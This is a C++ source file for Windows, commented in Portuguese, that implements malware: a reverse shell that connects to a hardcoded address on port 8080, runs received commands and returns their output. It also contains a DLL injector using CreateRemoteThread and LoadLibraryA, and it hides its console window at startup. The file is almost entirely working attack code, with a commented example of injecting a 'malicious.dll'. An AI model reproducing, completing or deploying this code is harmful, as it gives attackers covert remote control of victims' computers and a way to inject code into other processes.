

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <memory>
#include <stdexcept>
#include <cstdio>
#include <vector>
#include <thread>
#include <functional>

#pragma comment(lib, "Ws2_32.lib")

// ======================
// Classe base para exceções
// ======================
class WinAPIException : public std::runtime_error {
public:
    WinAPIException(const std::string& message, DWORD errorCode = GetLastError())
        : std::runtime_error(message + " (Error: " + std::to_string(errorCode) + ")") {}
};

// ======================
// Gerenciamento de Winsock
// ======================
class WinSockManager {
public:
    WinSockManager() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw WinAPIException("WSAStartup failed");
        }
    }
    
    ~WinSockManager() {
        WSACleanup();
    }
    
    // Proibir cópia
    WinSockManager(const WinSockManager&) = delete;
    WinSockManager& operator=(const WinSockManager&) = delete;
};

// ======================
// Gerenciamento de Sockets
// ======================
class SocketHandler {
    SOCKET socket_;
    
public:
    explicit SocketHandler(SOCKET s = INVALID_SOCKET) : socket_(s) {}
    
    ~SocketHandler() {
        if (socket_ != INVALID_SOCKET) {
            closesocket(socket_);
        }
    }
    
    // Proibir cópia
    SocketHandler(const SocketHandler&) = delete;
    SocketHandler& operator=(const SocketHandler&) = delete;
    
    // Permitir movimento
    SocketHandler(SocketHandler&& other) noexcept : socket_(other.socket_) {
        other.socket_ = INVALID_SOCKET;
    }
    
    SocketHandler& operator=(SocketHandler&& other) noexcept {
        if (this != &other) {
            socket_ = other.socket_;
            other.socket_ = INVALID_SOCKET;
        }
        return *this;
    }
    
    operator SOCKET() const { return socket_; }
    
    void connect(const sockaddr_in& address) {
        if (::connect(socket_, reinterpret_cast<const SOCKADDR*>(&address), 
                     sizeof(address)) == SOCKET_ERROR) {
            throw WinAPIException("Connection failed");
        }
    }
    
    int receive(char* buffer, int bufferSize) {
        int bytesReceived = recv(socket_, buffer, bufferSize - 1, 0);
        if (bytesReceived == SOCKET_ERROR) {
            throw WinAPIException("Receive failed");
        }
        return bytesReceived;
    }
    
    void send(const char* data, int dataSize) {
        if (::send(socket_, data, dataSize, 0) == SOCKET_ERROR) {
            throw WinAPIException("Send failed");
        }
    }
};

// ======================
// Execução de Comandos
// ======================
class CommandExecutor {
public:
    static std::string execute(const std::string& command) {
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
        if (!pipe) {
            throw WinAPIException("Failed to execute command");
        }

        std::string result;
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pipe.get()) != nullptr) {
            result += buffer;
        }

        return result;
    }
};

// ======================
// Injeção de Processos
// ======================
class ProcessInjector {
public:
    static bool inject(DWORD pid, const std::string& dllPath) {
        // Abrir o processo alvo
        ScopedHandle hProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid));
        if (!hProcess) return false;

        // Alocar memória no processo
        ScopedRemoteMemory pDllPath(
            hProcess.get(), 
            VirtualAllocEx(hProcess.get(), nullptr, dllPath.size() + 1, 
                          MEM_COMMIT, PAGE_READWRITE)
        );
        
        if (!pDllPath) return false;

        // Escrever o caminho da DLL
        if (!WriteProcessMemory(hProcess.get(), pDllPath.get(), dllPath.c_str(), 
                              dllPath.size() + 1, nullptr)) {
            return false;
        }

        // Obter função LoadLibrary
        HMODULE hKernel32 = GetModuleHandleA("Kernel32");
        auto loadLibraryFunc = reinterpret_cast<LPTHREAD_START_ROUTINE>(
            GetProcAddress(hKernel32, "LoadLibraryA")
        );

        // Criar thread remota
        ScopedHandle hThread(CreateRemoteThread(
            hProcess.get(), nullptr, 0, loadLibraryFunc, 
            pDllPath.get(), 0, nullptr
        ));
        
        if (!hThread) return false;

        // Esperar pela execução
        WaitForSingleObject(hThread.get(), INFINITE);
        return true;
    }

private:
    // RAII wrapper para handles de processo
    struct ScopedHandle {
        HANDLE handle;
        
        explicit ScopedHandle(HANDLE h = nullptr) : handle(h) {}
        ~ScopedHandle() { if (handle) CloseHandle(handle); }
        
        operator HANDLE() const { return handle; }
        
        // Proibir cópia
        ScopedHandle(const ScopedHandle&) = delete;
        ScopedHandle& operator=(const ScopedHandle&) = delete;
        
        // Permitir movimento
        ScopedHandle(ScopedHandle&& other) noexcept : handle(other.handle) {
            other.handle = nullptr;
        }
        
        ScopedHandle& operator=(ScopedHandle&& other) noexcept {
            if (this != &other) {
                handle = other.handle;
                other.handle = nullptr;
            }
            return *this;
        }
    };
    
    // RAII wrapper para memória remota
    struct ScopedRemoteMemory {
        HANDLE hProcess;
        LPVOID memory;
        
        ScopedRemoteMemory(HANDLE hProc, LPVOID mem) : hProcess(hProc), memory(mem) {}
        ~ScopedRemoteMemory() { 
            if (memory) VirtualFreeEx(hProcess, memory, 0, MEM_RELEASE); 
        }
        
        operator LPVOID() const { return memory; }
        
        // Proibir cópia
        ScopedRemoteMemory(const ScopedRemoteMemory&) = delete;
        ScopedRemoteMemory& operator=(const ScopedRemoteMemory&) = delete;
        
        // Permitir movimento
        ScopedRemoteMemory(ScopedRemoteMemory&& other) noexcept 
            : hProcess(other.hProcess), memory(other.memory) {
            other.memory = nullptr;
        }
        
        ScopedRemoteMemory& operator=(ScopedRemoteMemory&& other) noexcept {
            if (this != &other) {
                hProcess = other.hProcess;
                memory = other.memory;
                other.memory = nullptr;
            }
            return *this;
        }
    };
};

// ======================
// Shell Reversa
// ======================
class ReverseShell {
    static constexpr int DEFAULT_BUFLEN = 1024;
    static constexpr int DEFAULT_PORT = 8080;
    const char* DEFAULT_IP = "192.168.0.X";
    
public:
    void start() {
        WinSockManager winsock; // Gerenciamento automático do Winsock
        
        // Criar socket
        SocketHandler socket(::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP));
        if (socket == INVALID_SOCKET) {
            throw WinAPIException("Socket creation failed");
        }

        // Configurar endereço
        sockaddr_in serverAddress{};
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(DEFAULT_PORT);
        inet_pton(AF_INET, DEFAULT_IP, &serverAddress.sin_addr);

        // Conectar
        socket.connect(serverAddress);

        // Loop principal
        std::vector<char> commandBuffer(DEFAULT_BUFLEN);
        while (true) {
            try {
                // Receber comando
                int bytesReceived = socket.receive(commandBuffer.data(), DEFAULT_BUFLEN);
                if (bytesReceived <= 0) break;

                commandBuffer[bytesReceived] = '\0';
                std::string command(commandBuffer.data());

                // Executar comando
                std::string output;
                try {
                    output = CommandExecutor::execute(command);
                } catch (const std::exception& e) {
                    output = "[!] Error: " + std::string(e.what()) + "\n";
                }

                // Enviar saída
                socket.send(output.c_str(), output.size());
            } 
            catch (const WinAPIException& e) {
                // Tratar erros específicos de rede
                break;
            }
        }
    }
};

// ======================
// Utilitários do Sistema
// ======================
class SystemUtils {
public:
    static void hideConsole() {
        if (AllocConsole()) {
            if (HWND consoleWindow = FindWindowA("ConsoleWindowClass", nullptr)) {
                ShowWindow(consoleWindow, SW_HIDE);
            }
        }
    }
};

// ======================
// Ponto de entrada principal
// ======================
int main() {
    try {
        SystemUtils::hideConsole();
        
        // Exemplo de injeção de processo (requer PID e caminho válidos)
        // ProcessInjector::inject(1234, "C:\\path\\to\\malicious.dll");
        
        ReverseShell shell;
        shell.start();
        
        return EXIT_SUCCESS;
    } 
    catch (const std::exception& e) {
        // Em cenários reais, registrar o erro em log
        return EXIT_FAILURE;
    }
}
